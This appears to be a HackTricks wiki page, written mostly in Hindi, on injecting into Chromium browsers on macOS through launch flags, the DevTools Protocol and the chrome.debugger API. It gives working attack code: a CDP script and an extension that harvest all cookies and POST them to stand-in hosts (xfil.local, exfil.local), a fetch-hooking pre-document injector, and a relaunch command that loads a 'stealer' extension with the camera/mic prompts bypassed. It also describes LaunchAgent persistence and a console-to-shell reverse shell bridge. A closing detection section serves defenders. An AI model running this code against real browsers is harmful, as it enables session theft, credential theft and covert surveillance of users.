# macOS Chromium Injection

{{#include ../../../banners/hacktricks-training.md}}

## Basic Information

Google Chrome, Microsoft Edge, Brave, Arc, Vivaldi और Opera जैसे Chromium-based browsers सभी समान command-line switches, preference files और DevTools automation interfaces का उपयोग करते हैं। macOS पर GUI access वाला कोई भी user मौजूदा browser session को terminate करके उसे arbitrary flags, extensions या ऐसे DevTools endpoints के साथ फिर से खोल सकता है, जो target के entitlements के साथ run होते हैं।

#### macOS पर custom flags के साथ Chromium launch करना

macOS प्रत्येक Chromium profile के लिए एक single UI instance रखता है, इसलिए instrumentation के लिए सामान्यतः browser को force-close करना पड़ता है (उदाहरण के लिए `osascript -e 'tell application "Google Chrome" to quit'` के साथ)। Attackers आमतौर पर `open -na "Google Chrome" --args <flags>` के माध्यम से browser को relaunch करते हैं, ताकि app bundle को modify किए बिना arguments inject किए जा सकें। उस command को user LaunchAgent (`~/Library/LaunchAgents/*.plist`) या login hook के अंदर wrap करने से यह सुनिश्चित होता है कि tampered browser reboot/logoff के बाद फिर से respawn हो जाए।

#### `--load-extension` Flag

`--load-extension` flag unpacked extensions को auto-load करता है (comma-separated paths)। Legitimate extensions को block करते हुए केवल अपने payload को run कराने के लिए इसे `--disable-extensions-except` के साथ pair करें। Malicious extensions `debugger`, `webRequest` और `cookies` जैसी high-impact permissions मांग सकते हैं, ताकि DevTools protocols में pivot किया जा सके, CSP headers patch किए जा सकें, HTTPS downgrade किया जा सके या browser start होते ही session material exfiltrate किया जा सके।

#### `--remote-debugging-port` / `--remote-debugging-pipe` Flags

ये switches Chrome DevTools Protocol (CDP) को TCP या pipe के माध्यम से expose करते हैं, ताकि external tooling browser को drive कर सके। Google ने इस interface के infostealer abuse को व्यापक रूप से observe किया और Chrome 136 (March 2025) से ये switches default profile के लिए ignore किए जाते हैं, जब तक browser को non-standard `--user-data-dir` के साथ launch न किया जाए। यह real profiles पर App-Bound Encryption लागू करता है, लेकिन attackers अभी भी fresh profile spawn कर सकते हैं, victim को उसके अंदर authenticate करने के लिए बाध्य कर सकते हैं (phishing/triage assistance), और CDP के माध्यम से cookies, tokens, device trust states या WebAuthn registrations harvest कर सकते हैं।

#### `--user-data-dir` Flag

यह flag पूरे browser profile (History, Cookies, Login Data, Preference files आदि) को attacker-controlled path पर redirect करता है। Modern Chrome builds को `--remote-debugging-port` के साथ combine करते समय यह mandatory है, और यह tampered profile को isolated भी रखता है, ताकि आप pre-populated `Preferences` या `Secure Preferences` files डाल सकें, जो security prompts disable करती हैं, extensions auto-install करती हैं और default schemes बदलती हैं।

#### `--use-fake-ui-for-media-stream` Flag

यह switch camera/mic permission prompt को bypass करता है, ताकि `getUserMedia` call करने वाले किसी भी page को तुरंत access मिल जाए। इसे `--auto-select-desktop-capture-source="Entire Screen"`, `--kiosk` जैसे flags या CDP `Browser.grantPermissions` commands के साथ combine करके audio/video को silently capture किया जा सकता है, desk-share किया जा सकता है या user interaction के बिना WebRTC permission checks satisfy किए जा सकते हैं।

## Delivery & Relaunch Patterns Seen in the Wild

CDP abuse सामान्यतः initial payload के बजाय **post-exploitation** stage होता है। हाल ही की macOS developer-targeting campaign में poisoned Xcode **`Run Script` build phase** (`PBXShellScriptBuildPhase`) का उपयोग किया गया, ताकि code केवल तब execute हो जब victim project को **build** करे, न कि केवल उसे clone या open करने पर। उस first execution के बाद malware ने अन्य `.xcodeproj` trees को भी infect किया, malicious Git `pre-commit` hooks जोड़े और अधिक Xcode projects के लिए ZIP archives को search किया।

Chromium abuse के लिए यह महत्वपूर्ण है, क्योंकि attacker को browser binary को स्वयं patch करने की आवश्यकता नहीं होती। एक short-lived build-phase / `osascript` stager इसके बजाय **browser wrapper** (LaunchAgent, login item, Dock entry, trojanized app launcher आदि) install कर सकता है, जो user के हर बार start करने पर legitimate browser को attacker-controlled flags के साथ फिर से खोलता है।

> [!TIP]
> Developer endpoints पर unexpected `curl`, `osascript`, `xxd`, nested `base64` या Chrome relaunch logic के लिए `.pbxproj` files, `.git/hooks/pre-commit` और `.xcodeproj` वाली ZIPs को inspect करें।

## Remote Debugging & DevTools Protocol Abuse

जब Chrome को dedicated `--user-data-dir` और `--remote-debugging-port` के साथ relaunch किया जाता है, तब आप CDP के माध्यम से attach कर सकते हैं (उदाहरण के लिए `chrome-remote-interface`, `puppeteer` या `playwright` द्वारा) और high-privilege workflows को script कर सकते हैं:

- **Cookie/session theft:** `Network.getAllCookies` और `Storage.getCookies` HttpOnly values return करते हैं, भले ही App-Bound encryption सामान्यतः filesystem access को block करता हो, क्योंकि CDP running browser से उन्हें decrypt करने के लिए request करता है।
- **Permission tampering:** `Browser.grantPermissions` और `Emulation.setGeolocationOverride` आपको camera/mic prompts bypass करने देते हैं (विशेषकर `--use-fake-ui-for-media-stream` के साथ combine करने पर) या location-based security checks को falsify करने देते हैं।
- **Keystroke/script injection:** `Runtime.evaluate` active tab के अंदर arbitrary JavaScript execute करता है, जिससे credential lifting, DOM patching या navigation के बाद भी survive करने वाले persistence beacons inject करना संभव होता है।
- **Live exfiltration:** `Network.webRequestWillBeSentExtraInfo` और `Fetch.enable` disk artifacts को touch किए बिना authenticated requests/responses को real time में intercept करते हैं।
```javascript
import CDP from 'chrome-remote-interface';

(async () => {
const client = await CDP({host: '127.0.0.1', port: 9222});
const {Network, Runtime} = client;
await Network.enable();
const {cookies} = await Network.getAllCookies();
console.log(cookies.map(c => `${c.domain}:${c.name}`));
await Runtime.evaluate({expression: "fetch('https://xfil.local', {method:'POST', body:document.cookie})"});
await client.close();
})();
```
क्योंकि Chrome 136 default profile पर CDP को block करता है, इसलिए victim की मौजूदा `~/Library/Application Support/Google/Chrome` directory को staging path पर copy/paste करने से अब decrypted cookies प्राप्त नहीं होतीं। इसके बजाय, user को instrumented profile के अंदर authenticate करने के लिए social-engineer करें (जैसे, "helpful" support session) या CDP-controlled network hooks के ज़रिए transit में MFA tokens capture करें।

### XCSSET-style CDP Backdoor Chain

एक practical malware pattern यह है:

1. हर बार Chrome launch होने पर userland implant या wrapper को restart करें।
2. legitimate browser को `--remote-debugging-port=<port>` के साथ spawn करें और Chrome 136+ पर आमतौर पर paired non-default `--user-data-dir=<dir>` भी दें।
3. एक helper शुरू करें जो local CDP WebSocket से connect हो और `Page.addScriptToEvaluateOnNewDocument` के साथ pre-document hook register करे।

यह helper site code के run होने से **पहले** JavaScript inject कर सकता है, जो disk पर files patch किए बिना `window.fetch`, `XMLHttpRequest`, wallet providers या autofill flows को hook करने के लिए ideal है।
```javascript
await Page.enable();
await Runtime.enable();
await Page.addScriptToEvaluateOnNewDocument({
source: `
const oldFetch = window.fetch;
window.fetch = async (...args) => {
console.log('__HT__' + JSON.stringify(args[0]));
return oldFetch(...args);
};
`
});
Runtime.consoleAPICalled(({args}) => { /* helper parses __HT__ */ });
```
एक अधिक शक्तिशाली variant browser को **host command bridge** में बदल देता है: injected JavaScript delimiter-tagged `console.log` emit करता है, local helper `Runtime.consoleAPICalled` पर नज़र रखता है, marker को हटाता है, शेष भाग को host shell के माध्यम से execute करता है (उदाहरण के लिए Go का `exec.Command`), और stdout/stderr को attacker's WebSocket के माध्यम से वापस भेजता है। इससे tab-level script execution एक mostly fileless reverse shell में अपग्रेड हो जाता है।

## Extension-Based Injection via Debugger API

2023 के "Chrowned by an Extension" research ने प्रदर्शित किया कि `chrome.debugger` API का उपयोग करने वाला malicious extension किसी भी tab से attach हो सकता है और `--remote-debugging-port` के समान DevTools powers प्राप्त कर सकता है। इससे मूल isolation assumptions टूट जाती हैं (extensions अपने context में रहते हैं) और निम्नलिखित संभव हो जाते हैं:

- `Network.getAllCookies`/`Fetch.getResponseBody` के माध्यम से Silent cookie और credential theft।
- Site permissions (camera, microphone, geolocation) में modification और security interstitial bypass, जिससे phishing pages Chrome dialogs का impersonate कर सकते हैं।
- `Page.handleJavaScriptDialog`, `Page.setDownloadBehavior` या `Security.handleCertificateError` को programmatically drive करके TLS warnings, downloads या WebAuthn prompts में on-path tampering।

Extension को `--load-extension`/`--disable-extensions-except` के साथ load करें, ताकि किसी user interaction की आवश्यकता न हो। API को weaponize करने वाला एक minimal background script इस प्रकार दिखता है:
```javascript
chrome.tabs.onUpdated.addListener((tabId, info) => {
if (info.status !== 'complete') return;
chrome.debugger.attach({tabId}, '1.3', () => {
chrome.debugger.sendCommand({tabId}, 'Network.enable');
chrome.debugger.sendCommand({tabId}, 'Network.getAllCookies', {}, (res) => {
fetch('https://exfil.local/dump', {method: 'POST', body: JSON.stringify(res.cookies)});
});
});
});
```
यह extension `Debugger.paused` events को भी subscribe कर सकता है, ताकि JavaScript variables पढ़ सके, inline scripts को patch कर सके, या navigation के बाद भी बने रहने वाले custom breakpoints जोड़ सके। क्योंकि सब कुछ user की GUI session के अंदर चलता है, Gatekeeper और TCC trigger नहीं होते, जिससे यह technique ऐसे malware के लिए आदर्श बनती है जिसने पहले ही user context में execution प्राप्त कर लिया हो।

## Detection & Hunting

- उन Chromium browsers पर alert करें जिन्हें `--remote-debugging-port`, `--remote-debugging-pipe` या किसी suspicious `--user-data-dir` के साथ launch किया गया हो, खासकर जब parent `bash`, `sh`, `osascript`, `xcodebuild` या कोई LaunchAgent helper हो।
- ऐसी छोटी chains खोजें जिनमें कोई helper local CDP WebSocket खोलता है, `Page.addScriptToEvaluateOnNewDocument` register करता है, और फिर long-lived outbound WebSocket/HTTPS connection बनाता है।
- Browser `Runtime.consoleAPICalled` activity को attacker-supplied commands execute करने वाले child shells या helper processes के साथ correlate करके console-to-shell bridges की तलाश करें।
- Developer Macs पर `.pbxproj` की `PBXShellScriptBuildPhase` entries, Git `pre-commit` hooks, Dock/login item relaunchers और ZIP-contained Xcode projects की समीक्षा करें, ताकि browser wrapper installation का पता लगाया जा सके।
```bash
ps auxww | rg 'Chrome|Brave|Edge.*(--remote-debugging-port|--remote-debugging-pipe|--user-data-dir)'
lsof -nP -iTCP -sTCP:LISTEN | rg 'Chrome|Brave|Edge'
find ~/Library/LaunchAgents /Library/LaunchAgents -name '*.plist' -exec plutil -p {} \; 2>/dev/null | rg 'remote-debugging|Google Chrome|Brave|Edge'
rg -n 'PBXShellScriptBuildPhase|curl|osascript|xxd|base64' ~/Code --glob '*.pbxproj'
```
### Tools

- [https://github.com/breakpointHQ/snoop](https://github.com/breakpointHQ/snoop) - payload extensions के साथ Chromium launches को automate करता है और interactive CDP hooks expose करता है।
- [https://github.com/breakpointHQ/VOODOO](https://github.com/breakpointHQ/VOODOO) - macOS operators के लिए traffic interception और browser instrumentation पर केंद्रित समान tooling।
- [https://github.com/cyrus-and/chrome-remote-interface](https://github.com/cyrus-and/chrome-remote-interface) - `--remote-debugging-port` instance live होने के बाद Chrome DevTools Protocol dumps (cookies, DOM, permissions) को script करने के लिए Node.js library।

### Example
```bash
# Launch an instrumented Chrome profile listening on CDP and auto-granting media/capture access
osascript -e 'tell application "Google Chrome" to quit'
open -na "Google Chrome" --args \
--user-data-dir="$TMPDIR/chrome-privesc" \
--remote-debugging-port=9222 \
--load-extension="$PWD/stealer" \
--disable-extensions-except="$PWD/stealer" \
--use-fake-ui-for-media-stream \
--auto-select-desktop-capture-source="Entire Screen"

# Intercept traffic
voodoo intercept -b chrome
```
Tools links में और उदाहरण खोजें।

## संदर्भ

- [https://chromedevtools.github.io/devtools-protocol/v8/Runtime/](https://chromedevtools.github.io/devtools-protocol/v8/Runtime/)
- [https://chromedevtools.github.io/devtools-protocol/tot/Page/](https://chromedevtools.github.io/devtools-protocol/tot/Page/)
- [https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/](https://unit42.paloaltonetworks.com/xcsset-v40-malware-analysis/)
- [https://twitter.com/RonMasas/status/1758106347222995007](https://twitter.com/RonMasas/status/1758106347222995007)
- [https://developer.chrome.com/blog/remote-debugging-port](https://developer.chrome.com/blog/remote-debugging-port)
- [https://arxiv.org/abs/2305.11506](https://arxiv.org/abs/2305.11506)

{{#include ../../../banners/hacktricks-training.md}}
